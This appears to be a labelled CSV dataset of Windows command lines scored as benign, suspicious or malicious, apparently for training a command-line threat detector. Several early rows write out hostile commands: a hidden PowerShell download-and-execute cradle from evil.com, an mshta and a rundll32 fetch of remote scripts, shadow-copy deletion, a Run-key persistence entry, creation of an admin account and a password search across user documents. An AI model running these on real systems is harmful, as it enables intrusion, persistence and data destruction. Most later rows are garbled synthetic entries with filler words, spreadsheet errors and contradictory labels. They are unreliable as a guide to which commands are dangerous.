@@ -1,0 +1,321 @@
+﻿prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
+Cmd /k start chrome https://onedrive.live.com/embed?cid=880174EF88F116A9,Adversaries can spawn chrome.exe to download malicious files on the target system.,cmd,none,none,https://onedrive.live.com/embed?cid=880174EF88F116A9,none,Cmd /k start,Mitre Attack,0.3,suspicious
+Vssadmin.exe delete shadows /all /quiet,Adversaries may use vssadmin.exe to delete volume shadow copies to prevent system recovery.,vssadmin.exe,none,none,none,none,delete shadows /all /quiet,Mitre Attack,0.2,suspicious
+C:\Windows\system32\net.exe stop “samss” /y,Adversaries can use net.exe to stop services on the target system.,net.exe,"/y, samss",none,none,none,stop ,Mitre Attack,0.6,malicious
+Mshta https://median-researchers.000webhostapp.com/cmd.hta,Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript.,mshta,hta,none,https://median-researchers.000webhostapp.com,https://median-researchers.000webhostapp.com,cmd.hta,Mitre Attack,0.8,malicious
+dir,list files,none,none,none,none,none,none,none,0,benign
+dir /a /s,"List all files (including hidden/system), recursively",none,none,none,none,none,/a /s,none,0.1,benign
+ping google.com,Test internet connectivity,none,none,none,none,google.com,none,none,0.1,benign
+ping 172.20.3.2,Test network connectivity,none,none,none,none,172.20.3.2,none,none,0.1,benign
+arp -a,View ARP cache,none,none,none,none,none,arp -a,none,0.1,benign
+net share,List shared folders,none,none,none,none,none,net share,none,0.1,benign
+tracert google.com,Trace route to a host,none,none,none,none,google.com,tracert,none,0.2,benign
+net view \\hostname,View shared resources on a host,none,none,none,none,none,view \\hostname,none,0.1,benign
+cls,clear screen,none,none,none,none,none,cls,none,0.1,benign
+logoff,Log off current session,none,none,none,none,none,logoff,none,0.1,benign
+whoami /groups,Show user and group memberships,none,none,none,none,none,whoami /groups,none,0.1,benign
+set,Show environment variables,none,none,none,none,none,set,none,0.1,benign
+ren oldname.txt newname.txt,rename file,none,none,none,none,none,ren,none,0.1,benign
+mkdir C:\Logs\2025,Create a folder,none,none,none,C:\Logs\2025,none,mkdir,none,0.2,benign
+hostname,Get computer name,none,none,none,none,none,hostname,none,0.1,benign
+systeminfo,Full system info,none,none,none,none,none,systeminfo,none,0.1,benign
+ipconfig /all,Full network configuration,none,none,none,none,none,ipconfig /all,none,0.1,benign
+tasklist /v,Detailed running process,none,none,none,none,none,tasklist /v,none,0.1,benign
+shutdown /r /f /t 60,Restart computer after 60 seconds,none,none,none,none,none,shutdown /r /f /t 60,none,0.1,benign
+shutdown /s /f /t 0,Shutdown computer immediately,none,none,none,none,none,shutdown /s /f /t 0,none,0.1,benign
+defrag C: /U /V,Defragment drive C,none,none,none,none,none,defrag C: /U /V,none,0.1,benign
+diskpart,Launch disk partition tool (interactive),none,none,none,none,none,diskpart,none,0.1,benign
+sfc /scannow,Scan and repair system files,none,none,none,none,none,sfc /scannow,none,0.1,benign
+chkdsk C: /f,Check disk and fix errors,none,none,none,none,none,chkdsk C: /f,none,0.1,benign
+date ,Display or set the date,none,none,none,none,none,date,none,0.1,benign
+time,Display or set the system time,none,none,none,none,none,time,none,0.1,benign
+echo,Display messages or variables,none,none,none,none,none,echo,none,0.1,benign
+path,Display or set a search path for executable files,none,none,none,none,none,path,none,0.1,benign
+mklink,Create symbolic or hard links,none,none,none,none,none,mklink,none,0.1,benign
+tasklist,List currently running processes,none,none,none,none,none,tasklist,none,0.1,benign
+ftp 192.168.20.23,Transfer files to/from FTP servers,none,none,none,none,192.168.20.23,ftp,none,0.2,benign
+route PRINT -4,print route ipv4,none,none,none,none,none,route PRINT -4,none,0.1,benign
+route PRINT -6,print route ipv6,none,none,none,none,none,route PRINT -6,none,0.1,benign
+getmac, retrieve the MAC (Media Access Control) addresses of your network interfaces.,none,none,none,none,none,getmac,none,0.1,benign
+driverquery,List installed device drivers,none,none,none,none,none,driverquery,none,0.1,benign
+chkdsk,Check a disk and display a status report,none,none,none,none,none,chkdsk,none,0.1,benign
+help,Provide help information for commands,none,none,none,none,none,help,none,0.1,benign
+vol,Display disk volume label and serial number,none,none,none,none,none,vol,none,0.1,benign
+shutdown,Shut down or restart the computer,none,none,none,none,none,shutdown,none,0.1,benign
+quser,Display user session information,none,none,none,none,none,quser,none,0.1,benign
+query user,List users on the system,none,none,none,none,none,query user,none,0.1,benign
+query session,Display session information,none,none,none,none,none,query session,none,0.1,benign
+query process,Display process information,none,none,none,none,none,query process,none,0.1,benign
+netstat,Display network connections and statistics,none,none,none,none,none,netstat,none,0.1,benign
+restart-computer,Restart the computer (PowerShell),none,none,none,none,none,restart-computer,none,0.1,benign
+nslookup,Query Internet name servers,none,none,none,none,none,nslookup,none,0.1,benign
+net time,Synchronize system time with a server,none,none,none,none,none,net time,none,0.1,benign
+start,Start a separate window to run a program or command,none,none,none,none,none,start,none,0.1,benign
+exit,Exit the command prompt or script,none,none,none,none,none,exit,none,0.1,benign
+cleanmgr,Open Disk Cleanup utility,none,none,none,none,none,cleanmgr,none,0.1,benign
+sc query,Query the status of services,none,none,none,none,none,sc query,none,0.1,benign
+winget list,List installed packages,none,none,none,none,none,winget list,none,0.1,benign
+wmic logicaldisk,Query information about logical drives,wmic,none,none,none,none, logicaldisk,none,0.15,benign
+winget search id,Search for available packages by ID,none,none,none,none,none,winget search id,none,0.1,benign
+winget search name,Search for available packages by name,none,none,none,none,none,winget search name,none,0.1,benign
+winget search moniker,Search for available packages by moniker,none,none,none,none,none,winget search moniker,none,0.1,benign
+winget search tag,Search for available packages by tag,none,none,none,none,none,winget search tag,none,0.1,benign
+type test.txt,Display contents of a text file,none,none,none,none,none,type test.txt,none,0.1,benign
+echo Hello World,Display text,none,none,none,none,none,echo Hello World,none,0.1,benign
+wmic cpu get name,show cpu info,wmic,none,none,none,none, cpu get name,none,0.15,benign
+netstat -rn,show routing table,none,none,none,none,none,netstat -rn,none,0.1,benign
+sfc /scannow ,Scan and repair system files,none,none,none,none,none,sfc /scannow ,none,0.1,benign
+netstat -an ,View all active network connections,none,none,none,none,none,netstat -an ,none,0.1,benign
+move C:\file.txt D:\docs\ ,Move file to another location,none,none,none, C:\file.tx,none,move,none,0.2,benign
+net config workstation,Show network config,none,none,none,none,none,net config workstation,none,0.1,benign
+dir /s /b,List all files recursively,none,none,none,none,none,dir /s /b,none,0.1,benign
+attrib ,View or set file attributes,none,none,none,none,none,attrib ,none,0.1,benign
+"find /c /i ""error"" log.txt ","Count ""error"" lines in file",none,none,none,none,none,"find /c /i ""error"" log.txt ",none,0.1,benign
+notepad ,Open Notepad,none,none,none,none,none,notepad,none,0.1,benign
+calc ,Open Calculator,none,none,none,none,none,calc ,none,0.1,benign
+control ,Open Control Panel,none,none,none,none,none,control ,none,0.1,benign
+control printers ,Open Printers folder,none,none,none,none,none,control printers ,none,0.1,benign
+explorer C:\ ,Open File Explorer,none,none,none,none,none,explorer C:\ ,none,0.1,benign
+taskmgr ,Launch Task Manager,none,none,none,none,none,taskmgr ,none,0.1,benign
+msinfo32 ,Open system information GUI,none,none,none,none,none,msinfo32 ,none,0.1,benign
+devmgmt.msc,Open Device Manager,none,none,none,none,none,devmgmt.msc,none,0.1,benign
+dxdiag, Launch DirectX diagnostic,none,none,none,none,none,dxdiag,none,0.1,benign
+compmgmt.msc ,Open Computer Management,none,none,none,none,none,compmgmt.msc ,none,0.1,benign
+eventvwr ,Open Event Viewer,none,none,none,none,none,eventvwr ,none,0.1,benign
+services.msc ,Open Services Manager,none,none,none,none,none,services.msc ,none,0.1,benign
+powershell ,Open PowerShell shell,powershell ,none,none,none,none,none,none,0.05,benign
+mstsc, Launch Remote Desktop,none,none,none,none,none,mstsc,none,0.1,benign
+cmd ,Open a new CMD window,cmd ,none,none,none,none,cmd,none,0.05,benign
+gpresult /R ,View applied group policies,none,none,none,none,none,gpresult /R ,none,0.1,benign
+tree C:\ /f ,Show directory tree,none,none,none,none,none,tree C:\ /f ,none,0.1,benign
+powershell Get-Service ,List services in PowerShell,powershell,none,none,none,none,Get-Service ,none,0.15,benign
+ping -t 8.8.8.8 ,Continuous ping,none,none,none,none,8.8.8.8 ,ping -t 8.8.8.8 ,none,0.2,benign
+schtasks /create /tn MyTask ... ,Create new scheduled task,schtasks,none,none,none,none,/create /tn MyTask ... ,none,0.15,benign
+assoc ,Show file extension associations,none,none,none,none,none,assoc ,none,0.1,benign
+schtasks /query ,List scheduled tasks,schtasks,none,none,none,none,/query ,none,0.15,benign
+ftype,Show file type associations,none,none,none,none,none,ftype,none,0.1,benign
+fsutil fsinfo drives ,Show available drives,none,none,none,none,none,fsutil fsinfo drives ,none,0.1,benign
+powercfg /lastwake,Show last wake cause,none,none,none,none,none,powercfg /lastwake,none,0.1,benign
+fsutil volume diskfree C: ,Show free space,none,none,none,none,none,fsutil volume diskfree C: ,none,0.1,benign
+powercfg /a ,Show sleep states available,none,none,none,none,none,powercfg /a ,none,0.1,benign
+powercfg /batteryreport ,Generate battery report,none,none,none,none,none,powercfg /batteryreport ,none,0.1,benign
+ipconfig /flushdns,Clears the DNS resolver cache. This is a standard network troubleshooting command.,none,none,none,none,none,/flushdns,none,0.1,benign
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10,Lists the top 10 most CPU-intensive processes. A common administrative command for performance monitoring.,powershell,none,Sort-Object,none,none,Select-Object,none,0.1,benign
+net user NewUser P@ssword123 /add && net localgroup administrators NewUser /add,Creates a new user and adds them to the local administrators group. Can be malicious if unauthorized.,net.exe,"NewUser,P@ssword123",administrators,none,none,"/add,localgroup",none,0.7,malicious
+wevtutil qe Security /c:10 /f:text /rd:true,Queries the 10 most recent entries from the Security event log. Often used for reconnaissance or auditing.,wevtutil.exe,Security,none,none,none,"/c:10,/f:text",none,0.3,suspicious
+choco install vscode -y,Uses the Chocolatey package manager to install Visual Studio Code. A common developer command.,none,vscode,install,none,none,#NAME?,install,0.1,benign
+"wmic product get name,version",Enumerates all installed software and their versions. Useful for reconnaissance to find vulnerable software.,wmic,product,none,none,none,"get name,version",none,0.25,suspicious
+powershell.exe -nop -w hidden -c 'IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/shell.ps1'')',"Executes a downloaded PowerShell script in a hidden window, a classic fileless malware technique.",powershell.exe,New-Object,hidden,http://evil.com/shell.ps1,evil.com,"-nop,-w,hidden,-c,IEX",none,0.95,malicious
+fsutil fsinfo drives,Lists all drives on the system. A benign command for system information gathering.,fsutil.exe,none,none,none,none,fsinfo,none,0.1,benign
+netstat -ano -p tcp,"Displays active TCP connections, listening ports, and the owning process ID (PID). Commonly used for network reconnaissance.",netstat.exe,none,none,none,tcp,"-ano,-p",none,0.3,suspicious
+"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://pastebin.com/raw/somepayload.sct"")","Uses rundll32 and mshtml to execute a remote scriptlet from Pastebin, bypassing many security controls.",rundll32.exe,GetObject,javascript,https://pastebin.com/raw/somepayload.sct,pastebin.com,RunHTMLApplication,none,0.9,malicious
+"systeminfo | findstr /B /C:""OS Name"" /C:""OS Version""",Gets the operating system name and version. Benign reconnaissance.,systeminfo,findstr,none,none,none,"/B,/C",none,0.1,benign
+"powershell -c ""Get-ADComputer -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -lt (Get-Date).AddDays(-90)}""",Finds stale computer accounts in Active Directory that haven't logged on in 90 days. An advanced but benign admin query.,powershell,#NAME?,Filter,none,none,Get-Date,none,0.15,benign
+vssadmin create shadow /for=C:,"Creates a volume shadow copy for the C: drive. Could be part of a ransomware attack to access locked files, but is also a legitimate admin task.",vssadmin.exe,shadow,none,none,none,create,none,0.4,suspicious
+certutil.exe -encode payload.dll encoded.txt && certutil.exe -decode encoded.txt restored.dll,"Encodes and then decodes a DLL file, a technique often used to obfuscate malware and evade signature-based antivirus.",certutil.exe,"payload.dll,restored.dll",none,encoded.txt,none,"-encode,-decode",none,0.75,malicious
+arp -a,Displays the local ARP table. Benign command used for network diagnostics.,arp.exe,none,none,none,none,#NAME?,none,0.1,benign
+tasklist /SVC,Lists all running processes and the services hosted within them. Useful for reconnaissance to understand what is running on a system.,tasklist.exe,none,none,none,none,/SVC,none,0.25,suspicious
+"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ""Malware"" /t REG_SZ /d ""C:\Users\Public\payload.exe""",Creates a Run key registry entry to establish persistence. The malware will execute every time the user logs on.,reg.exe,payload.exe,Run,C:\Users\Public\payload.exe,none,"add,/v,/t,/d",persistence,0.85,malicious
+whoami /priv,Displays the security privileges of the current user. A common reconnaissance command for privilege escalation checks.,whoami.exe,none,none,none,none,/priv,none,0.3,suspicious
+"powershell Get-ChildItem -Path C:\Users -Recurse -Include .docx,.xlsx,*.pptx | Select-String -Pattern 'password'",Searches all Office documents in all user profiles for the string 'password'. A clear sign of data theft.,powershell,Select-String,password,C:\Users,none,Get-ChildItem,none,0.8,malicious
+wmic shadowcopy delete /nointeractive,Deletes all volume shadow copies on the system without prompting. This is a classic ransomware tactic to prevent file recovery.,wmic.exe,shadowcopy,delete,none,none,/nointeractive,none,0.7,malicious
+"tasklist.exe none -c,-recurse,-w",Task listing simulated command.,tasklist.exe,none,none,none,none,"-c,-recurse,-w",none,0.3,suspicious
+"netstat.exe spend /priv,/c,/add",Network connections simulated command.,netstat.exe,spend,none,none,example.com,"/priv,/c,/add",none,0.3,suspicious
+wevtutil.exe after /f,Event log query simulated command.,wevtutil.exe,after,none,none,internal.local,/f,high,0.8,malicious
+whoami.exe none -y,User information simulated command.,whoami.exe,none,none,key,example.com,#NAME?,none,0.3,suspicious
+"vssadmin.exe none -c,/nointeractive,/flushdns",Volume shadow service simulated command.,vssadmin.exe,none,none,none,example.com,"-c,/nointeractive,/flushdns",none,0.1,benign
+wmic hand -encode,WMIC tool simulated command.,wmic,hand,none,none,example.com,#NAME?,history,0.8,malicious
+wmic model -decode,WMIC tool simulated command.,wmic,model,none,read,internal.local,#NAME?,security,0.8,malicious
+"fsutil.exe little -nop,/flushdns",File system utility simulated command.,fsutil.exe,little,national,none,pastebin.com,"-nop,/flushdns",reason,0.8,malicious
+"powershell.exe million -nop,-decode,/priv",PowerShell-related simulated command.,powershell.exe,million,none,none,pastebin.com,"-nop,-decode,/priv",none,0.1,benign
+"netstat.exe none -nop,-c,/c",Network connections simulated command.,netstat.exe,none,none,none,internal.local,"-nop,-c,/c",year,0.8,malicious
+certutil.exe unit -nop,Certificate utility simulated command.,certutil.exe,unit,house,none,pastebin.com,#NAME?,writer,0.8,malicious
+"netstat.exe none -recurse,/add",Network connections simulated command.,netstat.exe,none,none,none,evil.com,"-recurse,/add",none,0.3,suspicious
+tasklist.exe strategy -c,Task listing simulated command.,tasklist.exe,strategy,others,none,example.com,-c,country,0.8,malicious
+rundll32.exe none -recurse,DLL runner simulated command.,rundll32.exe,none,imagine,none,evil.com,#NAME?,none,0.3,suspicious
+"tasklist.exe between /f,-recurse",Task listing simulated command.,tasklist.exe,between,him,none,example.com,"/f,-recurse",none,0.3,suspicious
+arp.exe place -nop,ARP table simulated command.,arp.exe,place,none,none,localhost,#NAME?,none,0.3,suspicious
+"net.exe none /priv,/svc,-decode",Net command simulated command.,net.exe,none,miss,none,example.com,"/priv,/svc,-decode",four,0.8,malicious
+rundll32.exe short /nointeractive,DLL runner simulated command.,rundll32.exe,short,partner,none,evil.com,/nointeractive,none,0.1,benign
+"netstat.exe use /add,/c,/f",Network connections simulated command.,netstat.exe,use,none,none,internal.local,"/add,/c,/f",none,0.1,benign
+reg.exe none /c,Registry editor simulated command.,reg.exe,none,none,bad,internal.local,/c,response,0.8,malicious
+"fsutil.exe none -nop,-y",File system utility simulated command.,fsutil.exe,none,none,none,localhost,"-nop,-y",none,0.1,benign
+"systeminfo none /svc,/f,/add",System info simulated command.,systeminfo,none,none,none,evil.com,"/svc,/f,/add",south,0.8,malicious
+"ipconfig policy -nop,-recurse",All discussion moment. simulated command.,ipconfig,policy,none,none,internal.local,"-nop,-recurse",none,0.3,suspicious
+ipconfig none /priv,Wife person keep subject else pay three. simulated command.,ipconfig,none,none,none,none,/priv,none,0.1,benign
+"powershell.exe none /c,-w",PowerShell-related simulated command.,powershell.exe,none,none,none,pastebin.com,"/c,-w",his,0.8,malicious
+whoami.exe use -w,User information simulated command.,whoami.exe,use,none,none,example.com,#NAME?,none,0.3,suspicious
+"tasklist.exe none -decode,-w",Task listing simulated command.,tasklist.exe,none,none,none,none,"-decode,-w",form,0.8,malicious
+"systeminfo animal -recurse,-decode,-y",System info simulated command.,systeminfo,animal,none,none,example.com,"-recurse,-decode,-y",none,0.1,benign
+"wmic far /svc,/flushdns,-y",WMIC tool simulated command.,wmic,far,none,none,localhost,"/svc,/flushdns,-y",admit,0.8,malicious
+"ipconfig over -nop,-c",Born back financial hotel report PM talk. simulated command.,ipconfig,over,none,none,internal.local,"-nop,-c",second,0.8,malicious
+"powershell.exe operation /flushdns,-y,/priv",PowerShell-related simulated command.,powershell.exe,operation,none,none,pastebin.com,"/flushdns,-y,/priv",none,0.1,benign
+"reg.exe while -w,/nointeractive",Registry editor simulated command.,reg.exe,while,none,by,evil.com,"-w,/nointeractive",none,0.1,benign
+"wevtutil.exe none /priv,-c",Event log query simulated command.,wevtutil.exe,none,understand,none,localhost,"/priv,-c",we,0.8,malicious
+"whoami.exe none /flushdns,-recurse",User information simulated command.,whoami.exe,none,none,might,localhost,"/flushdns,-recurse",none,0.3,suspicious
+"arp.exe none /flushdns,-recurse",ARP table simulated command.,arp.exe,none,former,none,internal.local,"/flushdns,-recurse",none,0.3,suspicious
+"fsutil.exe none /svc,-decode,/add",File system utility simulated command.,fsutil.exe,none,former,none,internal.local,"/svc,-decode,/add",born,0.8,malicious
+"systeminfo none /svc,-decode,-nop",System info simulated command.,systeminfo,none,management,none,localhost,"/svc,-decode,-nop",none,0.3,suspicious
+"fsutil.exe through /c,/priv",File system utility simulated command.,fsutil.exe,through,none,none,evil.com,"/c,/priv",none,0.1,benign
+"net.exe none /add,/c,/priv",Net command simulated command.,net.exe,none,none,none,none,"/add,/c,/priv",none,0.1,benign
+"arp.exe none -recurse,-decode",ARP table simulated command.,arp.exe,none,know,none,example.com,"-recurse,-decode",none,0.3,suspicious
+netstat.exe six -c,Network connections simulated command.,netstat.exe,six,none,none,evil.com,-c,miss,0.8,malicious
+systeminfo police /c,System info simulated command.,systeminfo,police,none,none,pastebin.com,/c,none,0.3,suspicious
+systeminfo choice /svc,System info simulated command.,systeminfo,choice,none,none,evil.com,/svc,room,0.8,malicious
+fsutil.exe none -c,File system utility simulated command.,fsutil.exe,none,none,none,none,-c,none,0.1,benign
+"whoami.exe none -w,-recurse,-nop",User information simulated command.,whoami.exe,none,none,none,pastebin.com,"-w,-recurse,-nop",probably,0.8,malicious
+whoami.exe what /add,User information simulated command.,whoami.exe,what,none,none,evil.com,/add,none,0.1,benign
+"reg.exe none /f,/c,-nop",Registry editor simulated command.,reg.exe,none,none,nearly,localhost,"/f,/c,-nop",none,0.3,suspicious
+"whoami.exe none -c,/flushdns,/priv",User information simulated command.,whoami.exe,none,strong,none,localhost,"-c,/flushdns,/priv",spring,0.8,malicious
+arp.exe left -encode,ARP table simulated command.,arp.exe,left,none,none,example.com,#NAME?,none,0.1,benign
+wmic girl -decode,WMIC tool simulated command.,wmic,girl,none,none,pastebin.com,#NAME?,economy,0.8,malicious
+whoami.exe none /add,User information simulated command.,whoami.exe,none,none,none,evil.com,/add,stock,0.8,malicious
+vssadmin.exe way /add,Volume shadow service simulated command.,vssadmin.exe,way,none,none,localhost,/add,on,0.8,malicious
+netstat.exe none -c,Network connections simulated command.,netstat.exe,none,none,none,internal.local,-c,none,0.1,benign
+vssadmin.exe system /nointeractive,Volume shadow service simulated command.,vssadmin.exe,system,outside,none,internal.local,/nointeractive,none,0.3,suspicious
+fsutil.exe none /nointeractive,File system utility simulated command.,fsutil.exe,none,none,none,example.com,/nointeractive,none,0.3,suspicious
+powershell.exe game /flushdns,PowerShell-related simulated command.,powershell.exe,game,none,none,internal.local,/flushdns,east,0.8,malicious
+"systeminfo none -w,-c,/c",System info simulated command.,systeminfo,none,none,memory,none,"-w,-c,/c",none,0.1,benign
+"wmic none /flushdns,/f",WMIC tool simulated command.,wmic,none,none,none,example.com,"/flushdns,/f",none,0.3,suspicious
+tasklist.exe none -c,Task listing simulated command.,tasklist.exe,none,none,none,internal.local,-c,way,0.8,malicious
+"wevtutil.exe live -y,/f",Event log query simulated command.,wevtutil.exe,live,recently,none,localhost,"-y,/f",none,0.1,benign
+"arp.exe none /nointeractive,/svc",ARP table simulated command.,arp.exe,none,none,none,localhost,"/nointeractive,/svc",accept,0.8,malicious
+"certutil.exe none /flushdns,/c,/add",Certificate utility simulated command.,certutil.exe,none,none,none,pastebin.com,"/flushdns,/c,/add",though,0.8,malicious
+"fsutil.exe agreement -c,-recurse,-decode",File system utility simulated command.,fsutil.exe,agreement,none,none,internal.local,"-c,-recurse,-decode",none,0.1,benign
+"wmic minute -w,/nointeractive",WMIC tool simulated command.,wmic,minute,budget,none,none,"-w,/nointeractive",none,0.3,suspicious
+reg.exe none /nointeractive,Registry editor simulated command.,reg.exe,none,none,area,none,/nointeractive,none,0.1,benign
+fsutil.exe none -y,File system utility simulated command.,fsutil.exe,none,none,none,evil.com,#NAME?,particular,0.8,malicious
+ipconfig interesting -recurse,May best firm information. simulated command.,ipconfig,interesting,none,none,internal.local,#NAME?,take,0.8,malicious
+"ipconfig none -w,/priv,-c",Hit officer huge evening language attention. simulated command.,ipconfig,none,none,none,localhost,"-w,/priv,-c",rest,0.8,malicious
+"wmic none -w,-recurse",WMIC tool simulated command.,wmic,none,finally,none,localhost,"-w,-recurse",none,0.3,suspicious
+"ipconfig establish -nop,-w",Spend early work design store bar Republican. simulated command.,ipconfig,establish,energy,none,evil.com,"-nop,-w",none,0.1,benign
+net.exe none -decode,Net command simulated command.,net.exe,none,approach,none,example.com,#NAME?,none,0.3,suspicious
+"systeminfo none /f,-nop,/c",System info simulated command.,systeminfo,none,none,none,pastebin.com,"/f,-nop,/c",none,0.1,benign
+rundll32.exe mouth -y,DLL runner simulated command.,rundll32.exe,mouth,third,newspaper,localhost,#NAME?,none,0.1,benign
+"tasklist.exe none -decode,-recurse",Task listing simulated command.,tasklist.exe,none,business,none,example.com,"-decode,-recurse",without,0.8,malicious
+"wevtutil.exe partner -w,/add",Event log query simulated command.,wevtutil.exe,partner,form,none,localhost,"-w,/add",none,0.3,suspicious
+"wmic none -encode,/add,-decode",WMIC tool simulated command.,wmic,none,none,court,internal.local,"-encode,/add,-decode",none,0.3,suspicious
+certutil.exe care -w,Certificate utility simulated command.,certutil.exe,care,none,none,localhost,#NAME?,none,0.3,suspicious
+"certutil.exe hair /c,-encode",Certificate utility simulated command.,certutil.exe,hair,process,none,example.com,"/c,-encode",radio,0.8,malicious
+"wmic floor -y,-recurse,/flushdns",WMIC tool simulated command.,wmic,floor,none,none,internal.local,"-y,-recurse,/flushdns",none,0.3,suspicious
+reg.exe none /f,Registry editor simulated command.,reg.exe,none,none,none,evil.com,/f,none,0.1,benign
+netstat.exe better -w,Network connections simulated command.,netstat.exe,better,none,none,localhost,#NAME?,none,0.3,suspicious
+"rundll32.exe none /f,-recurse,-encode",DLL runner simulated command.,rundll32.exe,none,none,none,internal.local,"/f,-recurse,-encode",none,0.3,suspicious
+"whoami.exe run -recurse,-c",User information simulated command.,whoami.exe,run,none,agreement,localhost,"-recurse,-c",none,0.1,benign
+"rundll32.exe none -w,/c,/svc",DLL runner simulated command.,rundll32.exe,none,none,program,example.com,"-w,/c,/svc",none,0.3,suspicious
+"tasklist.exe value /flushdns,-y",Task listing simulated command.,tasklist.exe,value,who,none,evil.com,"/flushdns,-y",none,0.1,benign
+"reg.exe none /f,-decode",Registry editor simulated command.,reg.exe,none,none,none,none,"/f,-decode",none,0.3,suspicious
+"powershell.exe none -encode,/add",PowerShell-related simulated command.,powershell.exe,none,none,none,localhost,"-encode,/add",read,0.8,malicious
+"net.exe lose /svc,/f,/priv",Net command simulated command.,net.exe,lose,none,none,example.com,"/svc,/f,/priv",teach,0.8,malicious
+"whoami.exe administration /svc,-c",User information simulated command.,whoami.exe,administration,what,none,evil.com,"/svc,-c",none,0.3,suspicious
+systeminfo bag -recurse,System info simulated command.,systeminfo,bag,none,none,example.com,#NAME?,none,0.3,suspicious
+"netstat.exe above -w,/f,/nointeractive",Network connections simulated command.,netstat.exe,above,none,none,localhost,"-w,/f,/nointeractive",none,0.1,benign
+"systeminfo none /f,-decode,-w",System info simulated command.,systeminfo,none,none,none,localhost,"/f,-decode,-w",none,0.3,suspicious
+"rundll32.exe nearly -c,/priv,/f",DLL runner simulated command.,rundll32.exe,nearly,know,deal,evil.com,"-c,/priv,/f",none,0.1,benign
+"wmic none -nop,/svc",WMIC tool simulated command.,wmic,none,degree,none,internal.local,"-nop,/svc",none,0.1,benign
+"wevtutil.exe why /add,/svc,-y",Event log query simulated command.,wevtutil.exe,why,none,investment,none,"/add,/svc,-y",none,0.1,benign
+"fsutil.exe none -w,-decode",File system utility simulated command.,fsutil.exe,none,it,none,example.com,"-w,-decode",none,0.3,suspicious
+"rundll32.exe none /nointeractive,-decode,-w",DLL runner simulated command.,rundll32.exe,none,none,none,internal.local,"/nointeractive,-decode,-w",none,0.1,benign
+wevtutil.exe none -decode,Event log query simulated command.,wevtutil.exe,none,none,none,none,#NAME?,none,0.1,benign
+"reg.exe none /c,-w,-nop",Registry editor simulated command.,reg.exe,none,away,none,evil.com,"/c,-w,-nop",collection,0.8,malicious
+reg.exe staff -recurse,Registry editor simulated command.,reg.exe,staff,none,none,evil.com,#NAME?,none,0.3,suspicious
+"powershell.exe none -nop,/flushdns",PowerShell-related simulated command.,powershell.exe,none,none,themselves,none,"-nop,/flushdns",none,0.3,suspicious
+tasklist.exe scene /nointeractive,Task listing simulated command.,tasklist.exe,scene,assume,type,localhost,/nointeractive,none,0.1,benign
+"powershell.exe remember -recurse,-encode,/c",PowerShell-related simulated command.,powershell.exe,remember,explain,none,localhost,"-recurse,-encode,/c",none,0.3,suspicious
+"wevtutil.exe none /f,-decode,/flushdns",Event log query simulated command.,wevtutil.exe,none,none,none,internal.local,"/f,-decode,/flushdns",challenge,0.8,malicious
+"rundll32.exe foot /svc,-encode",DLL runner simulated command.,rundll32.exe,foot,none,none,evil.com,"/svc,-encode",voice,0.8,malicious
+"rundll32.exe simple /nointeractive,-decode",DLL runner simulated command.,rundll32.exe,simple,none,none,none,"/nointeractive,-decode",summer,0.8,malicious
+"netstat.exe catch -recurse,/f",Network connections simulated command.,netstat.exe,catch,none,none,pastebin.com,"-recurse,/f",see,0.8,malicious
+"net.exe none -encode,/priv,/svc",Net command simulated command.,net.exe,none,none,none,pastebin.com,"-encode,/priv,/svc",none,0.1,benign
+"netstat.exe lose /add,-decode,/flushdns",Network connections simulated command.,netstat.exe,lose,none,none,pastebin.com,"/add,-decode,/flushdns",none,0.1,benign
+whoami.exe check -recurse,User information simulated command.,whoami.exe,check,none,none,internal.local,#NAME?,none,0.3,suspicious
+"ipconfig usually -w,-encode",Wait statement shoulder speak likely specific. simulated command.,ipconfig,usually,national,none,internal.local,"-w,-encode",none,0.1,benign
+"wmic none -w,/priv",WMIC tool simulated command.,wmic,none,risk,none,pastebin.com,"-w,/priv",blood,0.8,malicious
+"wmic military -encode,/priv,/c",WMIC tool simulated command.,wmic,military,none,none,none,"-encode,/priv,/c",none,0.1,benign
+"fsutil.exe benefit /c,-w,-c",File system utility simulated command.,fsutil.exe,benefit,none,none,example.com,"/c,-w,-c",none,0.1,benign
+"tasklist.exe certainly -nop,-y,-decode",Task listing simulated command.,tasklist.exe,certainly,none,none,pastebin.com,"-nop,-y,-decode",none,0.1,benign
+netstat.exe none -nop,Network connections simulated command.,netstat.exe,none,none,none,none,#NAME?,west,0.8,malicious
+"certutil.exe none -c,/c",Certificate utility simulated command.,certutil.exe,none,none,none,none,"-c,/c",none,0.1,benign
+net.exe network /priv,Net command simulated command.,net.exe,network,one,none,evil.com,/priv,none,0.3,suspicious
+"whoami.exe best -y,-nop,-recurse",User information simulated command.,whoami.exe,best,none,none,example.com,"-y,-nop,-recurse",none,0.1,benign
+"ipconfig move -c,/priv",Bed move too attack. simulated command.,ipconfig,move,none,none,pastebin.com,"-c,/priv",school,0.8,malicious
+"fsutil.exe none -y,/flushdns",File system utility simulated command.,fsutil.exe,none,none,however,none,"-y,/flushdns",none,0.1,benign
+whoami.exe none /f,User information simulated command.,whoami.exe,none,none,none,evil.com,/f,none,0.1,benign
+"netstat.exe how /priv,-c",Network connections simulated command.,netstat.exe,how,entire,none,localhost,"/priv,-c",member,0.8,malicious
+"wevtutil.exe none /nointeractive,-w",Event log query simulated command.,wevtutil.exe,none,none,thousand,evil.com,"/nointeractive,-w",none,0.1,benign
+"vssadmin.exe guess -recurse,-nop,/svc",Volume shadow service simulated command.,vssadmin.exe,guess,none,none,evil.com,"-recurse,-nop,/svc",none,0.3,suspicious
+rundll32.exe none /priv,DLL runner simulated command.,rundll32.exe,none,ahead,none,evil.com,/priv,performance,0.8,malicious
+"powershell.exe none /svc,/flushdns,/nointeractive",PowerShell-related simulated command.,powershell.exe,none,letter,none,none,"/svc,/flushdns,/nointeractive",none,0.1,benign
+certutil.exe none -y,Certificate utility simulated command.,certutil.exe,none,none,their,none,#NAME?,none,0.1,benign
+"wevtutil.exe none /f,-c",Event log query simulated command.,wevtutil.exe,none,hot,none,pastebin.com,"/f,-c",none,0.3,suspicious
+netstat.exe none -y,Network connections simulated command.,netstat.exe,none,use,none,pastebin.com,#NAME?,none,0.1,benign
